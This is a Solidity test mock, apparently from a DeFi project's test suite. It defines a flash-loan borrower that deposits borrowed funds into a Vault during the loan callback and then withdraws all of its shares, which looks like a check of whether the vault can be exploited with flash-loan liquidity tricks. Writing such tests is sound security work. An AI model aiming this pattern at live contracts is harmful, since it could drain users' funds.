// SPDX-License-Identifier: BUSL-1.1

pragma solidity 0.8.4;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import './../interfaces/IERC3156FlashLender.sol';
import './../interfaces/IERC3156FlashBorrower.sol';
import './../Vault.sol';
import './../VaultFactory.sol';
import "hardhat/console.sol";

contract FlashBorrowerMockWithExploit is IERC3156FlashBorrower {
    enum Action {NORMAL, OTHER}
    IERC3156FlashLender public lender;
    VaultFactory vaultFactory;

    constructor(IERC3156FlashLender _lender, VaultFactory _vaultFactory) public {
        lender = _lender;
        vaultFactory = _vaultFactory;
    }

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(lender), 'FLASH_BORROWER_UNTRUSTED_LENDER');
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).approve(msg.sender, balance);
        IERC20(token).approve(vaultFactory.tokenToVault(token), balance);
        Vault _v = Vault(vaultFactory.tokenToVault(token));
        _v.provideLiquidity(amount / 2);
        return keccak256('ERC3156FlashBorrower.onFlashLoan');
    }


    function flashLoan(
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        lender.flashLoan(this, token, amount, data);

        Vault _v = Vault(vaultFactory.tokenToVault(token));
        _v.removeLiquidity(_v.balanceOf(address(this)));
        return true;
    }
}
